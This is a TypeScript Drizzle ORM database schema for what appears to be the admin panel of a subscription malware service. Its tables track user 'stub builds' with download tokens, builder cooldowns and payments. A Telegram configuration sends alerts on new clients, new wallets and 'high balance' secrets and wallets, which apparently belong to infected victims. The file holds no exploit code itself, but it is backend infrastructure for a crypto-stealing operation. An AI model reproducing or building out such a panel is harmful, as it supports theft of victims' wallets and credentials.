import { pgTable, serial, text, boolean, timestamp, integer, index } from 'drizzle-orm/pg-core';
import { users } from './users';

// Stub builds table
export const stubBuilds = pgTable(
  'stub_builds',
  {
    id: serial('id').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id),
    buildId: text('build_id').notNull().unique(),
    downloadToken: text('download_token').notNull().unique(),
    filePath: text('file_path').notNull(),
    status: text('status', {
      enum: ['building', 'completed', 'failed', 'downloaded', 'expired'],
    })
      .notNull()
      .default('building'),
    createdAt: timestamp('created_at').defaultNow(),
    expiresAt: timestamp('expires_at').notNull(),
    downloadedAt: timestamp('downloaded_at'),
    errorMessage: text('error_message'),
  },
  (table) => ({
    userIdIdx: index('stub_builds_user_id_idx').on(table.userId),
    buildIdIdx: index('stub_builds_build_id_idx').on(table.buildId),
    statusIdx: index('stub_builds_status_idx').on(table.status),
    expiresAtIdx: index('stub_builds_expires_at_idx').on(table.expiresAt),
  }),
);

// Sessions table
export const sessions = pgTable(
  'sessions',
  {
    sid: text('sid').primaryKey(),
    sess: text('sess').notNull(),
    expire: integer('expire').notNull(),
  },
  (table) => ({
    expireIdx: index('sessions_expire_idx').on(table.expire),
  }),
);

// Notifications table
export const notifications = pgTable(
  'notifications',
  {
    id: serial('id').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id, { onDelete: 'cascade' }),
    type: text('type', {
      enum: [
        'payment_success',
        'payment_failed',
        'subscription_activated',
        'subscription_expired',
        'invite_assigned',
        'general',
      ],
    }).notNull(),
    title: text('title').notNull(),
    message: text('message').notNull(),
    isRead: boolean('is_read').default(false),
    createdAt: timestamp('created_at').defaultNow(),
    data: text('data'),
  },
  (table) => ({
    userIdIdx: index('notifications_user_id_idx').on(table.userId),
    typeIdx: index('notifications_type_idx').on(table.type),
    isReadIdx: index('notifications_is_read_idx').on(table.isRead),
    createdAtIdx: index('notifications_created_at_idx').on(table.createdAt),
  }),
);

// Builder configuration table
export const builderConfig = pgTable('builder_config', {
  id: integer('id').primaryKey().default(1),
  buildsEnabled: boolean('builds_enabled').default(true),
  buildCooldownSeconds: integer('build_cooldown_seconds').default(120),
  createdAt: timestamp('created_at').defaultNow(),
  updatedAt: timestamp('updated_at').defaultNow(),
});

// Telegram configuration table
export const telegramConfig = pgTable('telegram_config', {
  id: integer('id').primaryKey().default(1),
  botToken: text('bot_token'),
  channelId: text('channel_id'),
  notificationsEnabled: boolean('notifications_enabled').default(false),
  notifyNewClient: boolean('notify_new_client').default(false),
  notifyNewWallet: boolean('notify_new_wallet').default(false),
  notifyHighBalanceSecrets: boolean('notify_high_balance_secrets').default(false),
  notifyHighBalanceWallet: boolean('notify_high_balance_wallet').default(false),
  notifyPayments: boolean('notify_payments').default(false),
  highBalanceThreshold: text('high_balance_threshold').default('100'),
  createdAt: timestamp('created_at').defaultNow(),
  updatedAt: timestamp('updated_at').defaultNow(),
});

// Telegram reset bot configuration
export const telegramResetConfig = pgTable('telegram_reset_config', {
  id: integer('id').primaryKey().default(1),
  botToken: text('bot_token'),
  botUsername: text('bot_username'),
  enabled: boolean('enabled').default(false),
  createdAt: timestamp('created_at').defaultNow(),
  updatedAt: timestamp('updated_at').defaultNow(),
});

// Runtime persistence for reset bot
export const telegramResetRuntime = pgTable('telegram_reset_runtime', {
  id: integer('id').primaryKey().default(1),
  shouldRun: boolean('should_run').default(false),
  updatedAt: timestamp('updated_at').defaultNow(),
});

// User <-> Telegram linkage
export const userTelegram = pgTable(
  'user_telegram',
  {
    userId: integer('user_id')
      .primaryKey()
      .references(() => users.id, { onDelete: 'cascade' }),
    telegramUserId: text('telegram_user_id').notNull().unique(),
    telegramUsername: text('telegram_username'),
    startedDm: boolean('started_dm').default(false),
    linkedAt: timestamp('linked_at').defaultNow(),
  },
  (table) => ({
    telegramUserIdIdx: index('user_telegram_telegram_user_id_idx').on(table.telegramUserId),
  }),
);

// Temporary link codes for establishing Telegram link
export const telegramLinkCodes = pgTable(
  'telegram_link_codes',
  {
    code: text('code').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id, { onDelete: 'cascade' }),
    expiresAt: timestamp('expires_at').notNull(),
    createdAt: timestamp('created_at').defaultNow(),
  },
  (table) => ({
    userIdIdx: index('telegram_link_codes_user_id_idx').on(table.userId),
    expiresAtIdx: index('telegram_link_codes_expires_at_idx').on(table.expiresAt),
  }),
);

// Password reset tokens
export const passwordResetTokens = pgTable(
  'password_reset_tokens',
  {
    tokenHash: text('token_hash').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id, { onDelete: 'cascade' }),
    code: text('code'),
    expiresAt: timestamp('expires_at').notNull(),
    used: boolean('used').default(false),
    createdAt: timestamp('created_at').defaultNow(),
  },
  (table) => ({
    userIdIdx: index('password_reset_tokens_user_id_idx').on(table.userId),
    expiresAtIdx: index('password_reset_tokens_expires_at_idx').on(table.expiresAt),
    usedIdx: index('password_reset_tokens_used_idx').on(table.used),
  }),
);

// Telegram notifications log table
export const telegramNotifications = pgTable(
  'telegram_notifications',
  {
    id: serial('id').primaryKey(),
    type: text('type').notNull(),
    success: boolean('success').default(false),
    message: text('message').notNull(),
    createdAt: timestamp('created_at').defaultNow(),
  },
  (table) => ({
    typeIdx: index('telegram_notifications_type_idx').on(table.type),
    successIdx: index('telegram_notifications_success_idx').on(table.success),
    createdAtIdx: index('telegram_notifications_created_at_idx').on(table.createdAt),
  }),
);

// Global announcements table
export const globalAnnouncements = pgTable(
  'global_announcements',
  {
    id: serial('id').primaryKey(),
    title: text('title').notNull(),
    message: text('message').notNull(),
    isActive: boolean('is_active').default(true),
    isPermanent: boolean('is_permanent').default(false),
    expiresAt: timestamp('expires_at'),
    createdBy: integer('created_by')
      .notNull()
      .references(() => users.id),
    createdAt: timestamp('created_at').defaultNow(),
    updatedAt: timestamp('updated_at').defaultNow(),
  },
  (table) => ({
    isActiveIdx: index('global_announcements_is_active_idx').on(table.isActive),
    createdByIdx: index('global_announcements_created_by_idx').on(table.createdBy),
    expiresAtIdx: index('global_announcements_expires_at_idx').on(table.expiresAt),
  }),
);

// Export types
export type StubBuild = typeof stubBuilds.$inferSelect;
export type NewStubBuild = typeof stubBuilds.$inferInsert;

export type Session = typeof sessions.$inferSelect;
export type NewSession = typeof sessions.$inferInsert;

export type Notification = typeof notifications.$inferSelect;
export type NewNotification = typeof notifications.$inferInsert;

export type BuilderConfig = typeof builderConfig.$inferSelect;
export type NewBuilderConfig = typeof builderConfig.$inferInsert;

export type TelegramConfig = typeof telegramConfig.$inferSelect;
export type NewTelegramConfig = typeof telegramConfig.$inferInsert;

export type TelegramResetConfig = typeof telegramResetConfig.$inferSelect;
export type NewTelegramResetConfig = typeof telegramResetConfig.$inferInsert;

export type TelegramResetRuntime = typeof telegramResetRuntime.$inferSelect;
export type NewTelegramResetRuntime = typeof telegramResetRuntime.$inferInsert;

export type UserTelegram = typeof userTelegram.$inferSelect;
export type NewUserTelegram = typeof userTelegram.$inferInsert;

export type TelegramLinkCode = typeof telegramLinkCodes.$inferSelect;
export type NewTelegramLinkCode = typeof telegramLinkCodes.$inferInsert;

export type PasswordResetToken = typeof passwordResetTokens.$inferSelect;
export type NewPasswordResetToken = typeof passwordResetTokens.$inferInsert;

export type TelegramNotification = typeof telegramNotifications.$inferSelect;
export type NewTelegramNotification = typeof telegramNotifications.$inferInsert;

export type GlobalAnnouncement = typeof globalAnnouncements.$inferSelect;
export type NewGlobalAnnouncement = typeof globalAnnouncements.$inferInsert;
